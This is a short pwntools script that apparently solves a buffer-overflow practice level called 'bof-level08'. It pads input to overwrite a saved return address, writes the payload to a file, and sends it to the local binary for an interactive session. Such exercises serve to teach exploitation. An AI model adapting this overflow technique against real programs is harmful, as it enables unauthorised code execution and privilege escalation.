#!/usr/bin/env python
from pwn import *

######################################################
padding = ''
for letter in 'abcdefghijklmno':
  padding += letter*8
  
padding += '\x7a\x06\x40\x00\x00\x00\x00\x00'

padding = bytearray(padding, 'utf-8')

exp = b'\x00'

payload = padding + exp

with open('input.txt', 'wb') as f:
  f.write(payload)
######################################################

context.terminal = ['tmux', 'splitw', '-h']

#target = process('./bof-level08')
#target = process('./bof-level08', setuid=False)
target = process('./bof-level08',  env={'PATH':'/usr/bin/', 'global':'"A"*256'})
#target = process('./bof-level08', setuid=False, env={'PATH':'usr/bin', 'global':'"A"*256'})
#io = gdb.attach(target, 'b *receive_input+101')

target.send(payload)

target.interactive()
